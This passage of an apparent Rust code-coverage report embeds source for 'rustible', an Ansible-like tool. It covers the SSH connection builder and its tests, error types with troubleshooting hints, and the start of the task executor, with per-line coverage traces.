Option\u003cPathBuf\u003e,\n    timeout: Option\u003cDuration\u003e,\n    compression: bool,\n}\n\nimpl SshConnectionBuilder {\n    /// Create a new SSH connection builder\n    pub fn new(host: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            host: host.into(),\n            port: 22,\n            user: std::env::var(\"USER\").unwrap_or_else(|_| \"root\".to_string()),\n            password: None,\n            private_key: None,\n            timeout: Some(Duration::from_secs(30)),\n            compression: false,\n        }\n    }\n\n    /// Set the port\n    pub fn port(mut self, port: u16) -\u003e Self {\n        self.port = port;\n        self\n    }\n\n    /// Set the username\n    pub fn user(mut self, user: impl Into\u003cString\u003e) -\u003e Self {\n        self.user = user.into();\n        self\n    }\n\n    /// Set the password\n    pub fn password(mut self, password: impl Into\u003cString\u003e) -\u003e Self {\n        self.password = Some(password.into());\n        self\n    }\n\n    /// Set the private key path\n    pub fn private_key(mut self, path: impl Into\u003cPathBuf\u003e) -\u003e Self {\n        self.private_key = Some(path.into());\n        self\n    }\n\n    /// Set the connection timeout\n    pub fn timeout(mut self, timeout: Duration) -\u003e Self {\n        self.timeout = Some(timeout);\n        self\n    }\n\n    /// Enable compression\n    pub fn compression(mut self, enabled: bool) -\u003e Self {\n        self.compression = enabled;\n        self\n    }\n\n    /// Build and connect\n    pub async fn connect(self) -\u003e ConnectionResult\u003cSshConnection\u003e {\n        let host_config = HostConfig {\n            hostname: Some(self.host.clone()),\n            port: Some(self.port),\n            user: Some(self.user.clone()),\n            password: self.password,\n            identity_file: self.private_key.map(|p| p.to_string_lossy().to_string()),\n            connect_timeout: self.timeout.map(|d| d.as_secs()),\n            compression: self.compression,\n            ..Default::default()\n        };\n\n        let config = ConnectionConfig::default();\n        SshConnection::connect(\n            \u0026self.host,\n            self.port,\n            \u0026self.user,\n            Some(host_config),\n            \u0026config,\n        )\n        .await\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_build_command_basic() {\n        let options = ExecuteOptions::default();\n        let cmd = SshConnection::build_command(\"echo hello\", \u0026options);\n        assert_eq!(cmd, \"echo hello\");\n    }\n\n    #[test]\n    fn test_build_command_with_cwd() {\n        let options = ExecuteOptions::new().with_cwd(\"/tmp\");\n        let cmd = SshConnection::build_command(\"echo hello\", \u0026options);\n        assert_eq!(cmd, \"cd /tmp \u0026\u0026 echo hello\");\n    }\n\n    #[test]\n    fn test_build_command_with_escalation() {\n        let options = ExecuteOptions::new().with_escalation(Some(\"admin\".to_string()));\n        let cmd = SshConnection::build_command(\"echo hello\", \u0026options);\n        assert_eq!(cmd, \"sudo -u admin -- echo hello\");\n    }\n\n    #[test]\n    fn test_build_command_with_cwd_and_escalation() {\n        let options = ExecuteOptions::new()\n            .with_cwd(\"/var/log\")\n            .with_escalation(None);\n        let cmd = SshConnection::build_command(\"cat syslog\", \u0026options);\n        assert_eq!(cmd, \"cd /var/log \u0026\u0026 sudo -u root -- cat syslog\");\n    }\n\n    #[test]\n    fn test_ssh_connection_builder() {\n        let builder = SshConnectionBuilder::new(\"example.com\")\n            .port(2222)\n            .user(\"admin\")\n            .compression(true);\n\n        assert_eq!(builder.host, \"example.com\");\n        assert_eq!(builder.port, 2222);\n        assert_eq!(builder.user, \"admin\");\n        assert!(builder.compression);\n    }\n}\n","traces":[{"line":858,"address":[],"length":0,"stats":{"Line":0}},{"line":860,"address":[],"length":0,"stats":{"Line":0}},{"line":862,"address":[],"length":0,"stats":{"Line":0}},{"line":865,"address":[],"length":0,"stats":{"Line":0}},{"line":877,"address":[],"length":0,"stats":{"Line":0}},{"line":878,"address":[],"length":0,"stats":{"Line":0}},{"line":879,"address":[],"length":0,"stats":{"Line":0}},{"line":883,"address":[],"length":0,"stats":{"Line":0}},{"line":884,"address":[],"length":0,"stats":{"Line":0}},{"line":885,"address":[],"length":0,"stats":{"Line":0}},{"line":889,"address":[],"length":0,"stats":{"Line":0}},{"line":890,"address":[],"length":0,"stats":{"Line":0}},{"line":891,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":13},{"path":["/","home","artur","Repositories","rustible","src","error.rs"],"content":"//! Error types for Rustible.\n//!\n//! This module defines the error types used throughout Rustible, providing\n//! rich error information for debugging and user feedback.\n\nuse std::path::PathBuf;\nuse thiserror::Error;\n\n/// Result type alias for Rustible operations.\npub type Result\u003cT\u003e = std::result::Result\u003cT, Error\u003e;\n\n/// The main error type for Rustible.\n#[derive(Error, Debug)]\npub enum Error {\n    // ========================================================================\n    // Playbook Errors\n    // ========================================================================\n    /// Error parsing a playbook file.\n    #[error(\"Failed to parse playbook '{path}': {message}\")]\n    PlaybookParse {\n        /// Path to the playbook file\n        path: PathBuf,\n        /// Error message\n        message: String,\n        /// Source error\n        #[source]\n        source: Option\u003cBox\u003cdyn std::error::Error + Send + Sync\u003e\u003e,\n    },\n\n    /// Error validating playbook structure.\n    #[error(\"Playbook validation failed: {0}\")]\n    PlaybookValidation(String),\n\n    /// Play not found.\n    #[error(\"Play '{0}' not found in playbook\")]\n    PlayNotFound(String),\n\n    // ========================================================================\n    // Task Errors\n    // ========================================================================\n    /// Task execution failed.\n    #[error(\"Task '{task}' failed on host '{host}': {message}\")]\n    TaskFailed {\n        /// Task name\n        task: String,\n        /// Target host\n        host: String,\n        /// Error message\n        message: String,\n    },\n\n    /// Task timeout.\n    #[error(\"Task '{task}' timed out on host '{host}' after {timeout_secs} seconds\")]\n    TaskTimeout {\n        /// Task name\n        task: String,\n        /// Target host\n        host: String,\n        /// Timeout in seconds\n        timeout_secs: u64,\n    },\n\n    /// Task skipped due to condition.\n    #[error(\"Task '{0}' skipped\")]\n    TaskSkipped(String),\n\n    // ========================================================================\n    // Module Errors\n    // ========================================================================\n    /// Module not found.\n    #[error(\"Module '{module}' not found. Available modules: {available}\")]\n    ModuleNotFound {\n        /// Module name that was requested\n        module: String,\n        /// List of available modules\n        available: String,\n    },\n\n    /// Invalid module arguments.\n    #[error(\"Invalid arguments for module '{module}': {message}\")]\n    ModuleArgs {\n        /// Module name\n        module: String,\n        /// Error message\n        message: String,\n    },\n\n    /// Module execution failed.\n    #[error(\"Module '{module}' execution failed: {message}\")]\n    ModuleExecution {\n        /// Module name\n        module: String,\n        /// Error message\n        message: String,\n    },\n\n    // ========================================================================\n    // Inventory Errors\n    // ========================================================================\n    /// Error loading inventory.\n    #[error(\"Failed to load inventory from '{path}': {message}\")]\n    InventoryLoad {\n        /// Path to inventory\n        path: PathBuf,\n        /// Error message\n        message: String,\n    },\n\n    /// Host not found in inventory.\n    #[error(\"Host '{host}' not found in inventory. {suggestion}\")]\n    HostNotFound {\n        /// Host name that was requested\n        host: String,\n        /// Suggestion for resolving the issue\n        suggestion: String,\n    },\n\n    /// Group not found in inventory.\n    #[error(\"Group '{0}' not found in inventory\")]\n    GroupNotFound(String),\n\n    /// Invalid host pattern.\n    #[error(\"Invalid host pattern: '{0}'\")]\n    InvalidHostPattern(String),\n\n    // ========================================================================\n    // Connection Errors\n    // ========================================================================\n    /// Failed to connect to host.\n    #[error(\"Failed to connect to '{host}': {message}\\n\\nSuggestions:\\n{suggestions}\")]\n    ConnectionFailed {\n        /// Target host\n        host: String,\n        /// Error message\n        message: String,\n        /// Helpful suggestions for resolving the connection issue\n        suggestions: String,\n    },\n\n    /// Connection timeout.\n    #[error(\"Connection to '{host}' timed out after {timeout_secs} seconds\")]\n    ConnectionTimeout {\n        /// Target host\n        host: String,\n        /// Timeout in seconds\n        timeout_secs: u64,\n    },\n\n    /// Authentication failed.\n    #[error(\"Authentication failed for '{user}@{host}': {message}\\n\\nTroubleshooting:\\n{troubleshooting}\")]\n    AuthenticationFailed {\n        /// Username\n        user: String,\n        /// Target host\n        host: String,\n        /// Error message\n        message: String,\n        /// Troubleshooting suggestions\n        troubleshooting: String,\n    },\n\n    /// Command execution failed on remote.\n    #[error(\"Command failed on '{host}' with exit code {exit_code}: {message}\")]\n    RemoteCommandFailed {\n        /// Target host\n        host: String,\n        /// Exit code\n        exit_code: i32,\n        /// Error message\n        message: String,\n    },\n\n    /// File transfer failed.\n    #[error(\"File transfer failed: {0}\")]\n    FileTransfer(String),\n\n    // ========================================================================\n    // Variable Errors\n    // ========================================================================\n    /// Undefined variable.\n    #[error(\"Undefined variable: '{0}'\")]\n    UndefinedVariable(String),\n\n    /// Invalid variable value.\n    #[error(\"Invalid value for variable '{name}': {message}\")]\n    InvalidVariableValue {\n        /// Variable name\n        name: String,\n        /// Error message\n        message: String,\n    },\n\n    /// Variable file not found.\n    #[error(\"Variables file not found: {0}\")]\n    VariablesFileNotFound(PathBuf),\n\n    // ========================================================================\n    // Template Errors\n    // ========================================================================\n    /// Template syntax error.\n    #[error(\"Template syntax error in '{template}'{line_info}: {message}\\n\\nHelp: Check template syntax, variable names, and filter usage\")]\n    TemplateSyntax {\n        /// Template name or path\n        template: String,\n        /// Error message\n        message: String,\n        /// Line information (if available)\n        line_info: String,\n    },\n\n    /// Template rendering error.\n    #[error(\"Template rendering failed for '{template}': {message}\")]\n    TemplateRender {\n        /// Template name or path\n        template: String,\n        /// Error message\n        message: String,\n    },\n\n    // ========================================================================\n    // Role Errors\n    // ========================================================================\n    /// Role not found.\n    #[error(\"Role '{0}' not found\")]\n    RoleNotFound(String),\n\n    /// Role dependency error.\n    #[error(\"Role dependency error: {0}\")]\n    RoleDependency(String),\n\n    /// Invalid role structure.\n    #[error(\"Invalid role structure in '{role}': {message}\")]\n    InvalidRole {\n        /// Role name\n        role: String,\n        /// Error message\n        message: String,\n    },\n\n    // ========================================================================\n    // Vault Errors\n    // ========================================================================\n    /// Vault decryption failed.\n    #[error(\"Failed to decrypt vault: {0}\")]\n    VaultDecryption(String),\n\n    /// Vault encryption failed.\n    #[error(\"Failed to encrypt vault: {0}\")]\n    VaultEncryption(String),\n\n    /// Invalid vault password.\n    #[error(\"Invalid vault password\")]\n    InvalidVaultPassword,\n\n    /// Vault file not found.\n    #[error(\"Vault file not found: {0}\")]\n    VaultFileNotFound(PathBuf),\n\n    // ========================================================================\n    // Handler Errors\n    // ========================================================================\n    /// Handler not found.\n    #[error(\"Handler '{0}' not found\")]\n    HandlerNotFound(String),\n\n    /// Handler execution failed.\n    #[error(\"Handler '{handler}' failed on host '{host}': {message}\")]\n    HandlerFailed {\n        /// Handler name\n        handler: String,\n        /// Target host\n        host: String,\n        /// Error message\n        message: String,\n    },\n\n    // ========================================================================\n    // Configuration Errors\n    // ========================================================================\n    /// Configuration error.\n    #[error(\"Configuration error: {0}\")]\n    Config(String),\n\n    /// Invalid configuration value.\n    #[error(\"Invalid configuration value for '{key}': {message}\")]\n    InvalidConfig {\n        /// Configuration key\n        key: String,\n        /// Error message\n        message: String,\n    },\n\n    // ========================================================================\n    // IO Errors\n    // ========================================================================\n    /// File not found.\n    #[error(\"File not found: {0}\")]\n    FileNotFound(PathBuf),\n\n    /// IO error.\n    #[error(\"IO error: {0}\")]\n    Io(#[from] std::io::Error),\n\n    // ========================================================================\n    // Serialization Errors\n    // ========================================================================\n    /// YAML parsing error.\n    #[error(\"YAML parse error: {0}\")]\n    YamlParse(#[from] serde_yaml::Error),\n\n    /// JSON parsing error.\n    #[error(\"JSON parse error: {0}\")]\n    JsonParse(#[from] serde_json::Error),\n\n    /// TOML parsing error.\n    #[error(\"TOML parse error: {0}\")]\n    TomlParse(#[from] toml::de::Error),\n\n    /// Template error.\n    #[error(\"Template error: {0}\")]\n    Template(#[from] minijinja::Error),\n\n    /// Generic vault error.\n    #[error(\"Vault error: {0}\")]\n    Vault(String),\n\n    // ========================================================================\n    // Other Errors\n    // ========================================================================\n    /// Strategy error.\n    #[error(\"Execution strategy error: {0}\")]\n    Strategy(String),\n\n    /// Privilege escalation failed.\n    #[error(\"Privilege escalation failed on '{host}': {message}\\n\\nTry:\\n{suggestions}\")]\n    BecomeError {\n        /// Target host\n        host: String,\n        /// Error message\n        message: String,\n        /// Suggestions for fixing become issues\n        suggestions: String,\n    },\n\n    /// Internal error.\n    #[error(\"Internal error: {0}\")]\n    Internal(String),\n\n    /// Generic error with source.\n    #[error(\"{message}\")]\n    Other {\n        /// Error message\n        message: String,\n        /// Source error\n        #[source]\n        source: Option\u003cBox\u003cdyn std::error::Error + Send + Sync\u003e\u003e,\n    },\n}\n\nimpl Error {\n    /// Creates a new playbook parse error.\n    pub fn playbook_parse(\n        path: impl Into\u003cPathBuf\u003e,\n        message: impl Into\u003cString\u003e,\n        source: Option\u003cBox\u003cdyn std::error::Error + Send + Sync\u003e\u003e,\n    ) -\u003e Self {\n        Self::PlaybookParse {\n            path: path.into(),\n            message: message.into(),\n            source,\n        }\n    }\n\n    /// Creates a new task failed error.\n    pub fn task_failed(\n        task: impl Into\u003cString\u003e,\n        host: impl Into\u003cString\u003e,\n        message: impl Into\u003cString\u003e,\n    ) -\u003e Self {\n        Self::TaskFailed {\n            task: task.into(),\n            host: host.into(),\n            message: message.into(),\n        }\n    }\n\n    /// Creates a new connection failed error.\n    pub fn connection_failed(host: impl Into\u003cString\u003e, message: impl Into\u003cString\u003e) -\u003e Self {\n        Self::ConnectionFailed {\n            host: host.into(),\n            message: message.into(),\n            suggestions: \"- Check network connectivity\\n- Verify SSH key permissions\\n- Ensure host is reachable\".to_string(),\n        }\n    }\n\n    /// Creates a new module args error.\n    pub fn module_args(module: impl Into\u003cString\u003e, message: impl Into\u003cString\u003e) -\u003e Self {\n        Self::ModuleArgs {\n            module: module.into(),\n            message: message.into(),\n        }\n    }\n\n    /// Creates a new template render error.\n    pub fn template_render(template: impl Into\u003cString\u003e, message: impl Into\u003cString\u003e) -\u003e Self {\n        Self::TemplateRender {\n            template: template.into(),\n            message: message.into(),\n        }\n    }\n\n    /// Creates a new host not found error with suggestions.\n    pub fn host_not_found(host: impl Into\u003cString\u003e, available_hosts: \u0026[String]) -\u003e Self {\n        let host_str = host.into();\n\n        let suggestion = if available_hosts.is_empty() {\n            \"Inventory appears to be empty. Check your inventory file path with -i option\"\n                .to_string()\n        } else if available_hosts.len() \u003c= 10 {\n            format!(\n                \"Available hosts: {}. Use 'rustible list-hosts' to see all hosts\",\n                available_hosts.join(\", \")\n            )\n        } else {\n            format!(\n                \"Did you mean one of these? {}\\nUse 'rustible list-hosts' to see all {} hosts\",\n                available_hosts\n                    .iter()\n                    .take(5)\n                    .cloned()\n                    .collect::\u003cVec\u003c_\u003e\u003e()\n                    .join(\", \"),\n                available_hosts.len()\n            )\n        };\n\n        Self::HostNotFound {\n            host: host_str,\n            suggestion,\n        }\n    }\n\n    /// Creates a new module not found error with available modules list.\n    pub fn module_not_found(module: impl Into\u003cString\u003e, available_modules: \u0026[String]) -\u003e Self {\n        let available = if available_modules.len() \u003c= 20 {\n            available_modules.join(\", \")\n        } else {\n            format!(\n                \"{} (and {} more)\",\n                available_modules\n                    .iter()\n                    .take(20)\n                    .cloned()\n                    .collect::\u003cVec\u003c_\u003e\u003e()\n                    .join(\", \"),\n                available_modules.len() - 20\n            )\n        };\n\n        Self::ModuleNotFound {\n            module: module.into(),\n            available,\n        }\n    }\n\n    /// Creates a new authentication failed error with troubleshooting steps.\n    pub fn auth_failed(\n        user: impl Into\u003cString\u003e,\n        host: impl Into\u003cString\u003e,\n        message: impl Into\u003cString\u003e,\n    ) -\u003e Self {\n        let troubleshooting = \"1. Check SSH key permissions: chmod 600 ~/.ssh/id_rsa\n2. Verify the correct user is specified in inventory\n3. Test SSH manually: ssh \u003cuser\u003e@\u003chost\u003e\n4. Check if password authentication is required (use --ask-pass)\n5. Verify SSH agent has the key loaded: ssh-add -l\n6. Check authorized_keys file on remote host\n7. Review SSH server logs: /var/log/auth.log\"\n            .to_string();\n\n        Self::AuthenticationFailed {\n            user: user.into(),\n            host: host.into(),\n            message: message.into(),\n            troubleshooting,\n        }\n    }\n\n    /// Creates a new template syntax error with line information.\n    pub fn template_syntax(\n        template: impl Into\u003cString\u003e,\n        message: impl Into\u003cString\u003e,\n        line_number: Option\u003cusize\u003e,\n    ) -\u003e Self {\n        let line_info = if let Some(line) = line_number {\n            format!(\" at line {}\", line)\n        } else {\n            String::new()\n        };\n\n        Self::TemplateSyntax {\n            template: template.into(),\n            message: message.into(),\n            line_info,\n        }\n    }\n\n    /// Creates a new become error with method-specific suggestions.\n    pub fn become_failed(\n        host: impl Into\u003cString\u003e,\n        message: impl Into\u003cString\u003e,\n        method: \u0026str,\n    ) -\u003e Self {\n        let suggestions = match method {\n            \"sudo\" =\u003e {\n                \"- Verify user has sudo privileges: sudo -l\n- Check /etc/sudoers configuration\n- Try with --ask-become-pass if password is required\n- Verify become_user exists on target system\n- Check sudo logs: /var/log/sudo.log\"\n            }\n            \"su\" =\u003e {\n                \"- Verify target user password is correct\n- Use --ask-become-pass to provide password interactively\n- Check if 'su' is available on the system\n- Verify become_user exists on target system\"\n            }\n            \"doas\" =\u003e {\n                \"- Check /etc/doas.conf configuration\n- Verify user has doas privileges\n- Ensure doas is installed on target system\"\n            }\n            _ =\u003e {\n                \"- Verify the become_method is correctly configured\n- Check user has necessary privileges\n- Use --ask-become-pass if password required\n- Review privilege escalation settings in rustible.cfg\"\n            }\n        }\n        .to_string();\n\n        Self::BecomeError {\n            host: host.into(),\n            message: message.into(),\n            suggestions,\n        }\n    }\n\n    /// Returns true if this error is recoverable.\n    pub fn is_recoverable(\u0026self) -\u003e bool {\n        matches!(\n            self,\n            Error::TaskSkipped(_) | Error::ConnectionTimeout { .. } | Error::TaskTimeout { .. }\n        )\n    }\n\n    /// Returns the error code for CLI exit status.\n    pub fn exit_code(\u0026self) -\u003e i32 {\n        match self {\n            Error::TaskFailed { .. } | Error::ModuleExecution { .. } =\u003e 2,\n            Error::ConnectionFailed { .. } | Error::AuthenticationFailed { .. } =\u003e 3,\n            Error::PlaybookParse { .. } | Error::PlaybookValidation(_) =\u003e 4,\n            Error::InventoryLoad { .. } | Error::HostNotFound { .. } =\u003e 5,\n            Error::VaultDecryption(_) | Error::InvalidVaultPassword =\u003e 6,\n            _ =\u003e 1,\n        }\n    }\n}\n\n/// Extension trait for adding context to errors.\npub trait ErrorContext\u003cT\u003e {\n    /// Adds context to an error.\n    fn context(self, message: impl Into\u003cString\u003e) -\u003e Result\u003cT\u003e;\n\n    /// Adds context with a closure that is only evaluated on error.\n    fn with_context\u003cF, S\u003e(self, f: F) -\u003e Result\u003cT\u003e\n    where\n        F: FnOnce() -\u003e S,\n        S: Into\u003cString\u003e;\n}\n\nimpl\u003cT, E\u003e ErrorContext\u003cT\u003e for std::result::Result\u003cT, E\u003e\nwhere\n    E: std::error::Error + Send + Sync + 'static,\n{\n    fn context(self, message: impl Into\u003cString\u003e) -\u003e Result\u003cT\u003e {\n        self.map_err(|e| Error::Other {\n            message: message.into(),\n            source: Some(Box::new(e)),\n        })\n    }\n\n    fn with_context\u003cF, S\u003e(self, f: F) -\u003e Result\u003cT\u003e\n    where\n        F: FnOnce() -\u003e S,\n        S: Into\u003cString\u003e,\n    {\n        self.map_err(|e| Error::Other {\n            message: f().into(),\n            source: Some(Box::new(e)),\n        })\n    }\n}\n","traces":[{"line":10,"address":[75099387,75101376,75098901,75101120,75101400,75099973,75099242,75098896,75101144,75099096,75099192,75098936,75099968,75101534,75098912,75101205,75099168],"length":1,"stats":{"Line":0}},{"line":360,"address":[42529648],"length":1,"stats":{"Line":0}},{"line":362,"address":[70998671],"length":1,"stats":{"Line":0}},{"line":368,"address":[40627548],"length":1,"stats":{"Line":0}},{"line":369,"address":[40627555],"length":1,"stats":{"Line":0}},{"line":375,"address":[35225751,35225798],"length":1,"stats":{"Line":0}},{"line":381,"address":[42529264],"length":1,"stats":{"Line":0}},{"line":382,"address":[70999073],"length":1,"stats":{"Line":0}},{"line":383,"address":[40878512],"length":1,"stats":{"Line":0}},{"line":388,"address":[35225875],"length":1,"stats":{"Line":0}},{"line":390,"address":[],"length":0,"stats":{"Line":0}},{"line":391,"address":[70997312],"length":1,"stats":{"Line":0}},{"line":392,"address":[70997321],"length":1,"stats":{"Line":0}},{"line":397,"address":[35225686],"length":1,"stats":{"Line":0}},{"line":399,"address":[],"length":0,"stats":{"Line":0}},{"line":400,"address":[70997472],"length":1,"stats":{"Line":1}},{"line":405,"address":[48294006,48293247],"length":1,"stats":{"Line":0}},{"line":407,"address":[42528692,42528666,42528560],"length":1,"stats":{"Line":0}},{"line":408,"address":[48294174,48293415],"length":1,"stats":{"Line":0}},{"line":413,"address":[35216414],"length":1,"stats":{"Line":0}},{"line":414,"address":[35216437],"length":1,"stats":{"Line":0}},{"line":416,"address":[70999473],"length":1,"stats":{"Line":0}},{"line":417,"address":[42529232],"length":1,"stats":{"Line":0}},{"line":419,"address":[35216954,35216932],"length":1,"stats":{"Line":1}},{"line":420,"address":[35217027,35217234],"length":1,"stats":{"Line":0}},{"line":422,"address":[42532020,42531680,42532049],"length":1,"stats":{"Line":0}},{"line":425,"address":[36762496],"length":1,"stats":{"Line":0}},{"line":427,"address":[36762532],"length":1,"stats":{"Line":0}},{"line":428,"address":[42531936,42532038,42531723],"length":1,"stats":{"Line":0}},{"line":429,"address":[36762558],"length":1,"stats":{"Line":0}},{"line":430,"address":[70997060,70997255],"length":1,"stats":{"Line":0}},{"line":431,"address":[42532240],"length":1,"stats":{"Line":0}},{"line":432,"address":[35222464],"length":1,"stats":{"Line":0}},{"line":433,"address":[35222500],"length":1,"stats":{"Line":0}},{"line":444,"address":[36762805],"length":1,"stats":{"Line":0}},{"line":445,"address":[36762818],"length":1,"stats":{"Line":0}},{"line":446,"address":[70997974],"length":1,"stats":{"Line":0}},{"line":448,"address":[36762857],"length":1,"stats":{"Line":0}},{"line":450,"address":[36762883],"length":1,"stats":{"Line":0}},{"line":451,"address":[36762896],"length":1,"stats":{"Line":0}},{"line":452,"address":[36762909],"length":1,"stats":{"Line":0}},{"line":453,"address":[40805264],"length":1,"stats":{"Line":0}},{"line":454,"address":[36762935],"length":1,"stats":{"Line":0}},{"line":455,"address":[70998166],"length":1,"stats":{"Line":0}},{"line":456,"address":[42527701],"length":1,"stats":{"Line":0}},{"line":461,"address":[36763026],"length":1,"stats":{"Line":0}},{"line":467,"address":[40805489],"length":1,"stats":{"Line":0}},{"line":472,"address":[36763102],"length":1,"stats":{"Line":0}},{"line":473,"address":[36763112],"length":1,"stats":{"Line":0}},{"line":474,"address":[71001632],"length":1,"stats":{"Line":0}},{"line":475,"address":[42527431],"length":1,"stats":{"Line":0}},{"line":476,"address":[40805520],"length":1,"stats":{"Line":0}},{"line":477,"address":[40805523],"length":1,"stats":{"Line":0}},{"line":478,"address":[36763162],"length":1,"stats":{"Line":0}},{"line":482,"address":[40860837,40860597],"length":1,"stats":{"Line":0}},{"line":483,"address":[40860546,40860786],"length":1,"stats":{"Line":0}},{"line":484,"address":[40861166,40861006,40860561,40860801,40861136,40860976],"length":1,"stats":{"Line":0}},{"line":490,"address":[40847856,40849979,40849985],"length":1,"stats":{"Line":0}},{"line":495,"address":[70984374],"length":1,"stats":{"Line":0}},{"line":496,"address":[36763418],"length":1,"stats":{"Line":0}},{"line":498,"address":[42527920],"length":1,"stats":{"Line":0}},{"line":502,"address":[46213187],"length":1,"stats":{"Line":0}},{"line":503,"address":[70984528,70984548,70985206],"length":1,"stats":{"Line":0}},{"line":509,"address":[42527972],"length":1,"stats":{"Line":0}},{"line":514,"address":[36763964],"length":1,"stats":{"Line":0}},{"line":515,"address":[70985170,70984848,70985183],"length":1,"stats":{"Line":0}},{"line":516,"address":[36764016],"length":1,"stats":{"Line":0}},{"line":517,"address":[40848932],"length":1,"stats":{"Line":0}},{"line":518,"address":[42528050],"length":1,"stats":{"Line":0}},{"line":519,"address":[36764094],"length":1,"stats":{"Line":0}},{"line":520,"address":[40849222],"length":1,"stats":{"Line":0}},{"line":522,"address":[42527768],"length":1,"stats":{"Line":0}},{"line":523,"address":[70984892],"length":1,"stats":{"Line":0}},{"line":524,"address":[40848380],"length":1,"stats":{"Line":0}},{"line":525,"address":[36764250],"length":1,"stats":{"Line":0}},{"line":526,"address":[40849645],"length":1,"stats":{"Line":0}},{"line":528,"address":[36763678],"length":1,"stats":{"Line":0}},{"line":529,"address":[70985075],"length":1,"stats":{"Line":0}},{"line":530,"address":[40849495],"length":1,"stats":{"Line":0}},{"line":531,"address":[40849545],"length":1,"stats":{"Line":0}},{"line":533,"address":[42525469],"length":1,"stats":{"Line":0}},{"line":534,"address":[36764406],"length":1,"stats":{"Line":0}},{"line":535,"address":[40849355],"length":1,"stats":{"Line":0}},{"line":536,"address":[36764458],"length":1,"stats":{"Line":0}},{"line":537,"address":[36764481],"length":1,"stats":{"Line":0}},{"line":543,"address":[36764594],"length":1,"stats":{"Line":0}},{"line":544,"address":[40878111],"length":1,"stats":{"Line":0}},{"line":550,"address":[42526237],"length":1,"stats":{"Line":0}},{"line":551,"address":[30724444],"length":1,"stats":{"Line":0}},{"line":552,"address":[30724437],"length":1,"stats":{"Line":0}},{"line":558,"address":[42548440],"length":1,"stats":{"Line":0}},{"line":559,"address":[30724501],"length":1,"stats":{"Line":0}},{"line":560,"address":[30724555],"length":1,"stats":{"Line":0}},{"line":561,"address":[30724575],"length":1,"stats":{"Line":0}},{"line":562,"address":[30724545],"length":1,"stats":{"Line":0}},{"line":563,"address":[30724565],"length":1,"stats":{"Line":0}},{"line":564,"address":[30724585],"length":1,"stats":{"Line":0}},{"line":565,"address":[30724535],"length":1,"stats":{"Line":0}},{"line":586,"address":[36561200,36560736,36562384,36565162,36560741,36562389,36565152,36561225],"length":1,"stats":{"Line":0}},{"line":587,"address":[42548411],"length":1,"stats":{"Line":0}},{"line":588,"address":[],"length":0,"stats":{"Line":0}},{"line":589,"address":[42548416],"length":1,"stats":{"Line":0}},{"line":598,"address":[72559624,72549320,72552503,72551304,72551240,72559688,72549064,72561015,72553128,72558183,72559031,72552296,72559176,72550184,72554535,72549448,72556279,72552856,72558103,72555863,72553816,72554792,72561080,72548936,72554392,72549592,72555928,72556344,72559559,72560408,72551527,72553272,72551736,72557416,72557704,72558823,72556920,72559975,72555656,72558952,72553752,72554728,72557560,72553063,72548871,72557352,72557783,72558263,72560183,72560343,72560615,72560744,72550120,72550743,72552424,72549864,72554103,72554871,72560936,72549000,72557223,72552360,72555400,72559831,72555208,72557143,72552711,72557495,72551607,72550600,72549720,72556423,72553687,72558472,72552008,72558616,72559752,72560472,72555784,72556503,72554327,72549527,72559480,72555144,72556647,72553480,72549656,72552920,72553608,72552984,72555464,72551095,72556776,72556855,72549256,72556568,72549928,72559415,72560680,72554936,72556136,72556200,72549128,72557064,72560263,72560872,72557943,72549384,72560808,72551383,72559111,72549192,72556712,72550664,72558888,72549799,72553351,72552072,72555272,72557863,72553895,72549992,72554248,72560536,72554600,72550952,72555720,72553544,72554183,72550535,72551175,72560040,72550823,72555000,72557288,72558551,72557639,72555079,72558343,72552231,72552151,72558680,72561144,72550312,72553960,72551016,72554024,72558408,72550248,72551943,72559896,72551864,72551448,72556007,72555336,72550888,72550456,72556072,72553207,72553416,72555592,72554456,72555528,72550391,72556999,72559335,72560104,72554664,72551800,72552632,72552791,72558023,72551672,72552568,72550056,72559255,72558744],"length":1,"stats":{"Line":0}},{"line":599,"address":[],"length":0,"stats":{"Line":0}},{"line":600,"address":[],"length":0,"stats":{"Line":0}}],"covered":2,"coverable":105},{"path":["/","home","artur","Repositories","rustible","src","executor","mod.rs"],"content":"//! Core execution engine for Rustible\n//!\n//! This module provides the main task execution engine with:\n//! - Async task runner using tokio\n//! - Parallel execution across hosts\n//! - Task dependency resolution\n//! - Handler triggering system\n//! - Dry-run support\n\npub mod playbook;\npub mod runtime;\npub mod task;\n\nuse std::collections::{HashMap, HashSet};\nuse std::sync::Arc;\n\nuse futures::future::join_all;\nuse thiserror::Error;\nuse tokio::sync::{Mutex, RwLock, Semaphore};\nuse tracing::{debug, error, info, instrument, warn};\n\nuse crate::executor::playbook::{Play, Playbook};\nuse crate::executor::runtime::{ExecutionContext, RuntimeContext};\nuse crate::executor::task::{Handler, Task, TaskResult, TaskStatus};\n\n/// Errors that can occur during execution\n#[derive(Error, Debug)]\npub enum ExecutorError {\n    #[error(\"Task execution failed: {0}\")]\n    TaskFailed(String),\n\n    #[error(\"Host unreachable: {0}\")]\n    HostUnreachable(String),\n\n    #[error(\"Dependency cycle detected: {0}\")]\n    DependencyCycle(String),\n\n    #[error(\"Handler not found: {0}\")]\n    HandlerNotFound(String),\n\n    #[error(\"Variable not found: {0}\")]\n    VariableNotFound(String),\n\n    #[error(\"Condition evaluation failed: {0}\")]\n    ConditionError(String),\n\n    #[error(\"Module not found: {0}\")]\n    ModuleNotFound(String),\n\n    #[error(\"Playbook parse error: {0}\")]\n    ParseError(String),\n\n    #[error(\"IO error: {0}\")]\n    IoError(#[from] std::io::Error),\n\n    #[error(\"Runtime error: {0}\")]\n    RuntimeError(String),\n}\n\n/// Result type for executor operations\npub type ExecutorResult\u003cT\u003e = Result\u003cT, ExecutorError\u003e;\n\n/// Configuration for the executor\n#[derive(Debug, Clone)]\npub struct ExecutorConfig {\n    /// Maximum number of parallel host executions\n    pub forks: usize,\n    /// Enable dry-run mode (no actual changes)\n    pub check_mode: bool,\n    /// Enable diff mode (show changes)\n    pub diff_mode: bool,\n    /// Verbosity level (0-4)\n    pub verbosity: u8,\n    /// Strategy: \"linear\", \"free\", or \"host_pinned\"\n    pub strategy: ExecutionStrategy,\n    /// Timeout for task execution in seconds\n    pub task_timeout: u64,\n    /// Whether to gather facts automatically\n    pub gather_facts: bool,\n    /// Any extra variables passed via command line\n    pub extra_vars: HashMap\u003cString, serde_json::Value\u003e,\n}\n\nimpl Default for ExecutorConfig {\n    fn default() -\u003e Self {\n        Self {\n            forks: 5,\n            check_mode: false,\n            diff_mode: 